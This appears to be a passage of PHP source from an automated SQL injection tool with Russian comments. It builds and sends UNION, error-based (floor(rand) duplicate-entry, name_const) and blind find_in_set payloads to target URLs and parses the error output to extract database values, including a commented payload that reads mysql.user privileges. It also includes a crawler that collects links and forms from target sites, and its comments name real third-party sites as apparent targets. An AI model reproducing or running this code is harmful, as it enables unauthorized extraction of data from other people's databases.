		if(empty($k) or $k=='')
		{	
			//$this->d('tochka: emtpry(k) ');
			//return false;
		}
			 
		 if(!is_array($pole))$pole = array($pole);//это как раз наш запрос version к примеру
		
		 $zapr = '';//общая строка для наших полей
		 
		
		 
		//обволакиваем его спец символами, чтобы патом найти можно было бы
		foreach ($pole as $key=>$val)
		{
	  	
		 	if(count($pole)==1)//если одно поле
			{
				
				//  $zapr .= "0x5e,IFNULL(cast($val as char),' '),0x5e,";
				$zapr .= "IFNULL(unhex(Hex(cast($val as char))),' ')";
				
		 		//$zapr .= 'CHAR('.$this->charcher('[X]').')'.','.$val.',CHAR('.$this->charcher('[XX]').')';
		 		
		 	}else
			{//если несколько найти надо
				//$zapr .= "0x5e,unhex(Hex(cast($val as char))),0x5e,";
				$zapr .= "0x5e,IFNULL(unhex(Hex(cast($val as char))),' '),0x5e,";
				//$zapr .= ',CHAR('.$this->charcher('['.$val.']').')'.','.$val.',CHAR('.$this->charcher('['.$val.']').')';
		 	}
		}
	  
		//$this->d('tochka: $zapr '. $zapr);
		//exit;
		
		 $work_count = count($this->work);//рабочие поля где вывод есть
		
		//$this->d($this->work,'$work_count');
		//exit;
		
		 $new = array(); // Что на выход
		 $give = 0;
		 
		
		//if($this->dumpfile==true)
		//{
			//$query = $zapr;
		//}
		//else{
		
		if(is_array($order) AND count($pole)>1 and $order[0] !='')
			{
				$order2 = ' order by `'.$order[0].'` DESC ';
               
                
			}elseif(!is_array($order) and $order !=''){
                
                $order2 = ' order by '.$order.' DESC ';
            }else
			{
				$order2 = ' ';
			}
			
		//if($this->desc ==0 AND $this->desc_enable == true)
			//{	
				//$order2 = 'ORDER by id DESC';
		//	}
			
		
		
		
		 //подставляем колонки
		 for($col=1;$col<=$this->column;$col++)
			{
				
				if($col==1){$zap='';}else{$zap=',';}//запятая
			
				if(in_array($col, $this->work) AND $give==0)
				{
					$p = $col-1;

					$give++;
					
					
					$hh = $this->strtohex('[ddd]');
					
					$query .= $zap."(select CONCAT($hh,$zapr,$hh)".' '.$from.' '.$where.' '.$order2.' limit '.$limit.')';
					
					
					//$query .= $zap."CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)";
					
				}else
				{
						
					
					$query .= $zap.$col;	
					
				}
					
			}
		//}	
			//$this->d($query,'$query');
			//exit;
	
		

				$q = $query.' ';
				$q = str_replace(',,', ',',$q);
				$q = str_replace('  ', ' ',$q);
				
			
				
				//$this->set['sleep']['hex']=true;
				
				
				//$sss = $this->mysqlDumperFilter('SEleCT '.$q);
				
				$file = $this->send_sql('SEleCT '.$q,false);
				//exit;
				
				if($this->head_enable==true){
					
					file_put_contents('./file_sleepHEX_head_hex.txt',$file);
				}else{
					file_put_contents('./file_sleepHEX.txt',$file);
				}
				
				
				
				//$this->d($q,'$q');
				
				//$this->d($file,'$file');	
				
				//$this->d('tochka: send_sql-  '.'SEleCT '.$q);
				
				
				$this->file = $file;
				
				if($this->dumpfile==true)
				{
					
					//return $file;
		
				}
				

			
				
				//ищем результаты	
				if(count($pole)==1) //если он один предполагается
				{
					//preg_match_all("/\[X\](.*?)\[XX\]/is",$file,$arr);
					  preg_match_all("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
					//$this->d($arr[1][0],'$arr[1][0]');

					if(isset($arr[1][0]))return array($pole[0]=>$arr[1][0]);
					
					return false;
		 		
				}else//если не сколько полей было
				{
		 				
						preg_match_all("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
						
						//preg_match_all("~\^(.*?)\^~is",$arr22[0],$arr);
						
						//$this->d("~\[{$val}\](.*?)\[{$val}\]~iS",'reg ALL');
						
						//$this->d($arr,'arrA_LLL POLE HEX');
						
						
							
						
					$j=1;
					
					foreach ($pole as $val)
					{
						
						
						
						
						
				
						if(isset($arr[1][0]))
						{
							
							$arr[1][0] = str_replace('^^','^',$arr[1][0]);
							
							$b = explode('^',$arr[1][0]);
							
							$b_bew = array_filter($b, function($element) {
								return !empty($element);
							});
							
							
							//$this->d($b,'b');
							//$this->d($b_bew,'b_new');
							
							$export[$val] = $b[$j];
						}else
						{
							$export[$val] = '';
					

						}
						
						$j++;
						
					}
				}
			
			
			
				if(isset($export))
				{	
					return $export;
				}
				
				return false;
		

	}
	
	function mysqlGetValueSleepIFNULL($bd,$table,$pole,$limit=0,$order=array(),$where=''){//дочерняя
		
		
		if($table!=='')
		{
			if($bd=='')
			{
				$from = 'FROM '.$table.'';
			}else
			{
				$from = 'FROM '.$bd.'.'.$table.'';
			}
		}else
		{
			$from = '';
		}
		
		 
		$method = $this->sposob;
		
		//начало лимита
		$limit = $limit.',1';
		
		$query = "";//начальный запрос для sleep
		
		$k = $this->set['sleep']['coment'];
		
		
		
		
		if(empty($k) or $k=='')
		{	
			//$this->d('tochka: emtpry(k) ');
			//return false;
		}
			 
		 if(!is_array($pole))$pole = array($pole);//это как раз наш запрос version к примеру
		
		 $zapr = '';//общая строка для наших полей
		 
		
		 
		//обволакиваем его спец символами, чтобы патом найти можно было бы
		foreach ($pole as $key=>$val)
		{
	  	
		 	if(count($pole)==1)//если одно поле
			{
				
				//  $zapr .= "0x5e,IFNULL(cast($val as char),' '),0x5e,";
				$zapr .= "IFNULL(cast($val as char),' ')";
				//$zapr .= "IFNULL(cast($val as char),0x20)";
		 		//$zapr .= 'CHAR('.$this->charcher('[X]').')'.','.$val.',CHAR('.$this->charcher('[XX]').')';
		 		
		 	}else
			{//если несколько найти надо
				//$zapr .= "0x5e,unhex(Hex(cast($val as char))),0x5e,";
				$zapr .= "0x5e,IFNULL(cast($val as char),' '),0x5e,";
                //$zapr .= "0x5e,IFNULL(unhex(Hex(cast($val as char))),' '),0x5e,";
				//$zapr .= ',CHAR('.$this->charcher('['.$val.']').')'.','.$val.',CHAR('.$this->charcher('['.$val.']').')';
		 	}
		}
	  
		//$this->d('tochka: $zapr '. $zapr);
		//exit;
		
		 $work_count = count($this->work);//рабочие поля где вывод есть
		
		//$this->d($this->work,'$work_count');
		//exit;
		
		 $new = array(); // Что на выход
		 $give = 0;
		 
		
		//if($this->dumpfile==true)
		//{
			//$query = $zapr;
		//}
		//else{
		
		if(is_array($order) AND count($pole)>1 and $order[0] !='')
			{
				$order2 = ' order by `'.$order[0].'` DESC ';
               
                
			}elseif(!is_array($order) and $order !=''){
                
                $order2 = ' order by '.$order.' DESC ';
            }else
			{
				$order2 = ' ';
			}
			
		//if($this->desc ==0 AND $this->desc_enable == true)
			//{	
				//$order2 = 'ORDER by id DESC';
		//	}
			
		
		
		
		 //подставляем колонки
		 for($col=1;$col<=$this->column;$col++)
			{
				
				if($col==1){$zap='';}else{$zap=',';}//запятая
			
				if(in_array($col, $this->work) AND $give==0)
				{
					$p = $col-1;

					$give++;
					
					
					$hh = $this->strtohex('[ddd]');
					
					$query .= $zap."(select CONCAT($hh,$zapr,$hh)".' '.$from.' '.$where.' '.$order2.' limit '.$limit.')';
					
					
					//$query .= $zap."CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)";
					
				}else
				{
						
					
					$query .= $zap.$col;	
					
				}
					
			}
		//}	
			//$this->d($query,'$query');
			//exit;
	
		

				$q = $query.' ';
				$q = str_replace(',,', ',',$q);
				$q = str_replace('  ', ' ',$q);
				
			
				
				//$this->set['sleep']['hex']=true;
				
				
				//$sss = $this->mysqlDumperFilter('SEleCT '.$q);
				
				$file = $this->send_sql('SEleCT '.$q,false);
				//exit;
				
				if($this->head_enable==true){
					
					file_put_contents('./file_sleepHEX_head_hex.txt',$file);
				}else{
					file_put_contents('./file_sleepHEX.txt',$file);
				}
				
				
				
				//$this->d($q,'$q');
				
				//$this->d($file,'$file');	
				
				//$this->d('tochka: send_sql-  '.'SEleCT '.$q);
				
				
				$this->file = $file;
				
				if($this->dumpfile==true)
				{
					
					//return $file;
		
				}
				

			
				
				//ищем результаты	
				if(count($pole)==1) //если он один предполагается
				{
					//preg_match_all("/\[X\](.*?)\[XX\]/is",$file,$arr);
					  preg_match_all("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
					//$this->d($arr[1][0],'$arr[1][0]');

					if(isset($arr[1][0]))return array($pole[0]=>$arr[1][0]);
					
					return false;
		 		
				}else//если не сколько полей было
				{
		 				
						preg_match_all("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
						
						//preg_match_all("~\^(.*?)\^~is",$arr22[0],$arr);
						
						//$this->d("~\[{$val}\](.*?)\[{$val}\]~iS",'reg ALL');
						
						//$this->d($arr,'arrA_LLL POLE HEX');
						
						
							
						
					$j=1;
					
					foreach ($pole as $val)
					{
						
						
						
						
						
				
						if(isset($arr[1][0]))
						{
							
							$arr[1][0] = str_replace('^^','^',$arr[1][0]);
							
							$b = explode('^',$arr[1][0]);
							
							$b_bew = array_filter($b, function($element) {
								return !empty($element);
							});
							
							
							//$this->d($b,'b');
							//$this->d($b_bew,'b_new');
							
							$export[$val] = $b[$j];
						}else
						{
							$export[$val] = '';
					

						}
						
						$j++;
						
					}
				}
			
			
			
				if(isset($export))
				{	
					return $export;
				}
				
				return false;
		

	}
	
	
	
	function mysqGetValueByError($bd,$table,$pole,$limit=0,$order=array(),$where=''){//дочерняя
		
		//$this->d('mysqGetValueByError METHOD');
		
		$limit = $limit.',1';
		
		if($table!==''){
			
			$from = 'FROM+'.$bd.'.'.$table.'';
			
		}else{
			$from = '';
		}
		
		if($this->get_by_error_leght==0)
		{
							
			$url = $this->url.'19999999999'.$this->get_by_error.'+or+(select+count(*)from(select+1+union+select+2+union+select+3)x+group+by+concat('.$this->get_by_error.'x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1'.$this->get_by_error.',floor(rand(0)*2)))+--+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
			
			$file = $this->getContents($url);
			//echo $url.'<br/>';
			//$this->d($url,'$url');
			
			//$this->d($file,'$file');
			
			//	die();
				//[MySQL][ODBC 3.51 Driver][mysqld-5.5.47-0+deb8u1]Unknown column 'x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1' in 'group statem
			preg_match_all("~\Duplicate entry \'(.*?)\'~is",$file,$arr);
			
			//$this->d($arr,'$arr1');
			
			if(!isset($arr[1][0])){
				preg_match_all("~(\s)?Unknown column \'(.*?)\' in~is",$file,$arr);
				//$this->d($arr,'$arr2');
			}
			
			
			///Duplicate entry 'x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1' for key 1
			$this->get_by_error_leght = substr_count($arr[1][0], 'x1');
			$this->get_by_error_leght = $this->get_by_error_leght*2;
			
			
			//$this->d($this->get_by_error_leght,'$this->get_by_error_leght');
			//$this->d($this->get_by_error,'$this->get_by_error');
			
			
			//echo $this->get_by_error_leght;
			//die($this->get_by_error_leght);
		}
		
		//print_r($pole);
		
		//Нужна проверка на concat в запросе
		
		//Узнать какая длинн
		
		
		
		
		
		if(is_array($pole)){
			
			foreach ($pole as $value){

				$url = $this->url.'19999999999'.$this->get_by_error.'+or+(select+count(*)from(select+1+union+select+2+union+select+3)x+group+by+concat((select+length('.$value.')+'.$from .'+'.$where.'+limit+'.$limit.'),CHAR('.$this->charcher("|").'),floor(rand(0)*2)))+--+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
									
				$file = $this->getContents($url);
				
			//	echo $url.'<br/>';
				//echo $file.'<br/>';
				//die();
				preg_match_all("~\Duplicate entry \'(.*?)\|~is",$file,$arr);

				//print_r($arr);
				//			die();
				$len_stroki = $arr[1][0];
				$count_zapr = ceil($arr[1][0]/$this->get_by_error_leght);
				
				// echo $this->get_by_error_leght;
				//die();
				////
				$stroka = '';
			
				$start = 1;
			
			
				$fin   = $this->get_by_error_leght;
			
			//	echo $count_zapr.'<br/>';
				
			for($i=1;$i<=$count_zapr;$i++){

				//echo $start.'<br>';
				
				$url = $this->url.'19999999999'.$this->get_by_error.'+or+(select+count(*)from(select+1+union+select+2+union+select+3)x+group+by+concat(mid((select+'.$value.'+'.$from.'+'.$where.'+limit+'.$limit.'),'.$start.','.$fin.'),floor(rand(0)*2)))+--+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
				$file = $this->getContents($url);
					
				//echo $url.'<br/>';
				//echo $file.'<br/><br/>';
				
				preg_match_all("~\Duplicate entry \'(.*?)\' for key~is",$file,$arr);

				$stroka.= @$arr[1][0];
				$start = $start + $this->get_by_error_leght;
				$fin   = $fin + $this->get_by_error_leght;
				
			
				//echo $i.'<br/>';
			
			}
			//die();
			$stroka = substr($stroka, 0, -1);
				
				////
				
				$new[$value] = $stroka;

				
			}
				return $new;
			
		}else{

			$url = $this->url.'19999999999'.$this->get_by_error.'+or+(select+count(*)from(select+1+union+select+2+union+select+3)x+group+by+concat((select+length('.$pole.')+'.$from.'+'.$where.'+limit+'.$limit.'),CHAR('.$this->charcher("|").'),floor(rand(0)*2)))+--+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
			$file = $this->getContents($url);
			preg_match_all("~\Duplicate entry \'(.*?)\|~is",$file,$arr);

			$len_stroki = $arr[1][0];
			$count_zapr = ceil($arr[1][0]/$this->get_by_error_leght);
			
			//echo $count_zapr;
			
			$stroka = '';
			
			$start = 1;
			$fin   = $this->get_by_error_leght;
			
			for($i=1;$i<=$count_zapr;$i++){
				
				
				$url = $this->url.'19999999999'.$this->get_by_error.'+or+(select+count(*)from(select+1+union+select+2+union+select+3)x+group+by+concat(mid((select+'.$pole.'+'.$from.'+'.$where.'+limit+'.$limit.'),'.$start.','.$fin.'),floor(rand(0)*2)))+--+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
				$file = $this->getContents($url);
				preg_match_all("~\Duplicate entry \'(.*?)\' for key~",$file,$arr);

				$stroka.= $arr[1][0];
				$start+= $this->get_by_error_leght;
				$fin  += $this->get_by_error_leght;
				
			
				//echo $i.'<br/>';
			
			}
			
			$stroka = substr($stroka, 0, -1);
			
			return array($pole=>$stroka);
			
			
		}
		
		
	
	}
	
	function mysqGetValueByErrorNEW($bd,$table,$pole,$limit=0,$order=array(),$where=''){//дочерняя
		
		$limit = $limit.',1';
		
		if($table!==''){
			
			$from = 'FROM+'.$bd.'.'.$table.'';
			
		}else{
			$from = '';
		}
		
		if($this->get_by_error_leght==0){
							
			
			
			$url = $this->url.$this->get_by_error.'+or+(1,2)=(select*from(select%20name_const(CHAR(120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49),1),name_const(CHAR(120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49,120,49),1))a)';
			
		//	echo $url;
			
			$file = $this->getContents($url);
			//echo $file;
			//die();
				
			preg_match_all("~\Duplicate column name \'(.*?)\'~is",$file,$arr);
			///Duplicate entry 'x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1x1' for key 1
			$this->get_by_error_leght = substr_count($arr[1][0], 'x1');
			$this->get_by_error_leght = $this->get_by_error_leght*2;
			
			//echo $this->get_by_error_leght;
			//die();
			//echo $this->get_by_error_leght;
			//die($this->get_by_error_leght);
		}
		
		//print_r($pole);
		
		//Нужна проверка на concat в запросе
		
		//Узнать какая длинн
		
		
		
		
		
		if(is_array($pole)){
			
			foreach ($pole as $value){

						
				$qu = '(select+'.$value.'+'.$from.'+'.$where.'+limit+'.$limit.')';
			
				$url = $this->url.$this->get_by_error.'+or+(1,2)=(select*from(select%20name_const('.$qu.',1),name_const('.$qu.',1)+'.$from .'+'.$where.'+limit+'.$limit.')a)+AND+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
				
				
				$file = $this->getContents($url);
				//echo $url.'<br/>';
			//	echo $file.'<br/>---<br/>';
				preg_match_all("~\Duplicate column name \'(.*?)\'~",$file,$arr);

				$stroka = @$arr[1][0];

				$new[$pole] = $stroka;
			
			}

				////
				
				$new[$pole] = $stroka;

				return $new;
				
			
		}else{

		

				
				$qu = '(select+'.$pole.'+'.$from.'+'.$where.'+limit+'.$limit.')';
			
				$url = $this->url.$this->get_by_error.'+or+(1,2)=(select*from(select%20name_const('.$qu.',1),name_const('.$qu.',1)+'.$from .'+'.$where.'+limit+'.$limit.')a)+AND+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
				
				
				$file = $this->getContents($url);
			//	echo $url.'<br/>';
			//	echo $file.'<br/>---<br/>';
				preg_match_all("~\Duplicate column name \'(.*?)\'~",$file,$arr);

				$stroka = @$arr[1][0];

				return array($pole=>$stroka);
			
			
		}
		
		
	
	}
	
	function mysqlGetByOrder($bd,$table,$pole,$limit=0,$order=array(),$where=''){//дочерняя
		
		$limit = $limit.',1';
		
		if($table!==''){
			
			$from = 'FROM+'.$bd.'.'.$table.'';
			
		}else{
			$from = '';
		}
		

	
		//id+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%280x7e%2C0x27%2Cfile_priv%2C0x27%2C0x7e%29+FROM+mysql.user+LIMIT+9%2C1%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1	
				
		if(is_array($pole)){
			
			
			foreach ($pole as $val){

				$url = $this->url.$this->get_by_error.'+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%280x7e%2C0x27%2C'.$val.'%2C0x27%2C0x7e%29+'.$from.'+'.$where.'+LIMIT+'.$limit.'%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+'.$this->get_by_error.'1'.$this->get_by_error.'%3D'.$this->get_by_error.'1';

			//	echo $url.'<br/>';
				
				$file = $this->getContents($url);
		
				preg_match_all("~\'(.*?)\' for key~",$file,$arr);
		
				$arr[1][0] = str_replace("'~1",'',$arr[1][0]);
				//$this->d($arr,'$arr 1');
				$new[$val] = $arr[1][0];
					
				
			}
			
			return $new;
			
		}else
		{

			$url = $this->url.$this->get_by_error.'+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%28'.$pole.'%2C0x27%2C0x7e%29+'.$from.'+'.$where.'+LIMIT+'.$limit.'%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+'.$this->get_by_error.'1'.$this->get_by_error.'%3D'.$this->get_by_error.'1';
		
			$file = $this->getContents($url);
			//echo $file;
		
			preg_match_all("~\'(.*?)\' for key~",$file,$arr);
			$arr[1][0] = str_replace("'~1",'',$arr[1][0]);
			
			//$this->d($arr,'$arr 2');
			return array($pole=>$arr[1][0]);
			
		}	

		return false;
	}
	
	
	 
	
	
	////////////////////////////////////////////////////////////////
	//////////////////////////BLIND/////////////////////////////////
	////////////////////////////////////////////////////////////////
	
	public function send_xpl($url, $xpl){
			return $this->content($url.$xpl);
		}

	public function content($url){ //thx  Elekt
		
		$timeout = 30;

		$h=@parse_url($url);
		//echo $url."\r\n";

		$url = trim($url);
		
		if(extension_loaded('curl'))
		{
			//$this->d($url,'url');
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_ENCODING, '');
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
			curl_setopt($ch, CURLOPT_MAXREDIRS, 2);
			curl_setopt($ch, CURLOPT_URL, $url);
			$page = curl_exec($ch);
			curl_close($ch);
			
			//$this->d($page,'$page');
			//exit;
			
			return $page;
		}

		elseif(extension_loaded('sockets'))
		{
			if(@strtolower(@$h['scheme'])=='https')
			 {
				 if(!@extension_loaded('openssl')) return;
				 $h['port']=443;
				 $fp = @fsockopen('ssl://'.@$h['host'], @$h['port'], $errno, $errstr, $timeout);if(!$fp) return;
			 }
			else
			 {
				 $h['port']=80;
				 $fp = @fsockopen(@$h['host'], @$h['port'], $errno, $errstr, $timeout);if(!$fp) return;
			 }
			$str="GET ".@$h['path'].'?'.@$h['query']." HTTP/1.0\r\n".
				 "Host: ".@$h['host']."\r\n".
				 "\r\n";
			@fputs($fp, $str);
			$page=''; while (!@feof($fp)) {$page.=@fgets($fp,128);}
			@fclose ($fp);
			//die($page);
			return $page;
		}

		elseif( in_array(@ini_get('allow_url_fopen'),array('On','ON','1','Y','Yes','YES'))
			&&
			(@$h['scheme']=='https'?@extension_loaded('openssl'):1)
		  )
		{
			@ini_alter('default_socket_timeout',$timeout);
			return @file_get_contents($url);
		}
		else 
		{
			
			return;}
	}	

	public function arr(){
		//return array_merge(range('0', '9'),range('a', 'f'));
		return range('a', 'z');
	}

	public function build_xpl($array, $pos){
		$what_to_find = $this->what_to_find;
		foreach ($array as $letter)
		{
			$set .= $letter.',';
		}
		$set = substr($set, 0, -1);
		$str = "find_in_set(substring(($what_to_find),$pos,1),'$set') ";
		return $str;
	}

	public function grep_exploited($url){

	}

	public function blind($url){
	
	
	
	
	$limit=0;      // row number
	$from=1;       // pages from
	$array = $this->arr(); // a-z0-9
	$symbols = 32;
	//$url = 'http://produmar.com/en/productos_inter_categoria.php?id3=39&id=15&idd=';
	//$url = 'http://dailyjournalhomes.com/detail.php?mls=';
	//http://tori3.com/posts/idoe-uah.es/en/idoe_noticias.php?id=1

	//$what_to_find = 'select+'.$field.'+from+'.$table.'+limit+'.$limit.',1'; // select query


	$this->what_to_find = 'USER()';
	
	 
			
	echo "Generating templates";
	
	for($i=1;$i<=count($array);$i++)
	{	
	 echo ".";
	 $res[$i]=$this->send_xpl($url, ($from-1)+$i);
	}
	echo " [OK]\r\n<br><br>";
	//$this->d($res,'$res');
	//exit;
	flush();
	/////////////////////////////

	echo "Getting keywords";
	for($i=1;$i<=count($array);$i++)
	{
		echo ".";
		$splitted1 = str_split($res[$i], 10); // UGLY HACK
		
		
		//$this->d($res[$i],'$res[$i]');
		//$this->d($splitted1,'$splitted1');
		//exit;
		
		$keys[$i] = array();
		
		for($j=1;$j<=count($array);$j++)
		{ 
			if($j==$i){continue;}

			$splitted2 = str_split($res[$j], 10); // UGLY HACK 
			
			//$this->d($splitted2,'$splitted2');
			
			
			
			$diffs = array_diff($splitted1, $splitted2);
			
		//	$this->d($diffs,'$diffs');
			//exit;

			$keys[$i] = array_merge($keys[$i], $diffs);
			
			//d($keys,'keys');
			//exit;
		}

		$keys[$i] = array_unique($keys[$i]);
	}
	echo " [OK]\r\n<br><br>";
	//$this->d($keys,'keys');
	//exit;
	flush();
	/////////////////////////////

	echo "Filtering keywords";
	for($i=1;$i<=count($array);$i++)
	{
		echo ".";
		
		for($j=1;$j<=count($array);$j++)
		{	
			if($j==$i)continue;
			
			$diffs = array();
			$diffs = array_diff($keys[$i], $keys[$j]);
			$keys[$i] = $diffs;
		}
	}
	echo " [OK]\r\n<br><br>";
	//$this->d($keys,'keys2');
	
	//exit;
	flush();
	/////////////////////////////

	echo "Sending queries";
	$xpl_pages = array();

	for($i=1;$i<=$symbols;$i++) 
	{ 
	 echo ".";
	 $xpl = $this->build_xpl($array, $i);
	 if($from>1)
	   $xpl = ($from-1)."%2B".$xpl;
	 $xpl_pages[$i] = $this->send_xpl($url, $xpl);
	}
	echo " [OK]\r\n<br><br>";
	flush();
	/////////////////////////////

	echo "Getting value: ";
	foreach($xpl_pages as $x)
	{
	  for($i=1;$i<=count($array);$i++)
	  {
		if(strpos($x,$keys[$i][0])!==false)
		{
		  echo $array[$i-1];
		  flush();
		  break;
		}
	  }
	} 

	echo " [DONE]\r\n";




	
}

	
		
	
	
	
	////////////////////////////////////////////////////////////////
	//////////////////////////ПАУК/////////////////////////////////
	////////////////////////////////////////////////////////////////
	
	//post_url - это куда данные отправляем
	//get_to_url -  САЙТ + uuname=TerkeyVinsont&upass=Ttyhqwek8723&upass2=Ttyhqwek872
	//postdata = массив со значениями поста
	//postquery - чистый запрос
	
	public function start_crowler($value="anykstenai.lt"){
		
		//$value="http://testphp.vulnweb.com";
	
		//$value="http://testasp.vulnweb.com";
		
		//$value ="http://demo.testfire.net";
		
		//$value = "http://kbsacademykota.com";
		
		//$value = "http://game2make.com";
		
		//$value = 'http://toyshop.se';
		
		//$value="anykstenai.lt";
        
        
        //$value = 'https://my.tsianalytics.com/';
		
		$this->d($value,'crowler');
		
		$value = str_replace(array('http://','https://'),'',$value);
		
		
		$this->l1 = array();
		
		
	
		$this->crowler_url = $value;// заносим host в глобальную переменную
		

		$value2 = 'http://'.$value;
		$pars = parse_url($value2);
		$this->host_crawler = $pars['host'];
		
		
		$this->check_post_form=1;
		
		$this->count_links_good = 1;
		
		$page =5;
		$this->page = 5;
		$this->time_all = time();
		$this->time2 = $this->time_crowler;
		$links_pars = array();
		
		
		///////////////// STEP 1 //////////////////////
		//$this->crowler_google($value);//ищем с гугла линки
		//$this->l1_google = array_slice($this->l1_google, 0, 10);
		//$this->d($this->l1_google,'$this->l1_google');
	
		//exit;
	
		///////////////// STEP 2 ИЩЕМ ВАЩЕ ВСЕ С ГЛАВНОЙ//////////////////////
		$crowler_links = $this->get_url($value,true); // парсим все линки с главной странички
		$crowler_links = array_slice($crowler_links, 0, $this->limit_page0); // режим по количеству ссылок с главной для чтения всех ссылок вдруг там есть ?
		//$this->d($crowler_links,'$crowler_links');// скок чего собрал ваще главной
		//exit;
	
		
		///////////////// STEP 3 ИЩЕМ ЛИНКИ С SITEMAP //////////////////////
		$this->sitemap = true; // парсим все линки c sitemap
		$crowler_links_map = $this->get_url($value.'/sitemap.xml',true); 
		
		if($crowler_links_map =='' or empty($crowler_links_map)){
			$crowler_links_map = array();
		}
		$this->sitemap = false;
		//$this->d($crowler_links_map,'$crowler_links_map KARTS');// скок чего собрал ваще главной
	
	
		
	
		$crowler_links_all = array_merge($crowler_links, $crowler_links_map);//объединяем главную и sitemap.xml
		//$this->d($crowler_links_all,'$crowler_links_all one MAIN+sitemap');// скок чего собрал ваще главной
		
		//exit;
		
		if(count($crowler_links_all)==0 AND count($this->l1_google)==0)
		{
			$this->d('not linls get_url crowler page1 and google');
			return false;
		}else
		{
			
			
			
			///////////////// STEP 4 ИЩЕТ ИНТЕРЕСНЫЕ ПОДХОДЯЩИЕ ИМЕНО ЛИНКИ С ГЛАВНОЙ СТРАНИЦЫ //////////////////////
			$links_pars = array();
			//главную отдельно+sitemap
			$res = $this->crowler_parse_url_main($crowler_links_all,1); 
			
			$this->d($this->l1_main,'links_pars подходящих с ? найденные с главной + sitemap !!!');
			
			
		
			///////////////// STEP 5 ИЩЕМ ФОРМЫ //////////////////////
			
			if(!isset($this->l1_main_form_slice))$this->l1_main_form_slice=20;
			
			$this->l1_main_form = array_unique($this->l1_main_form);
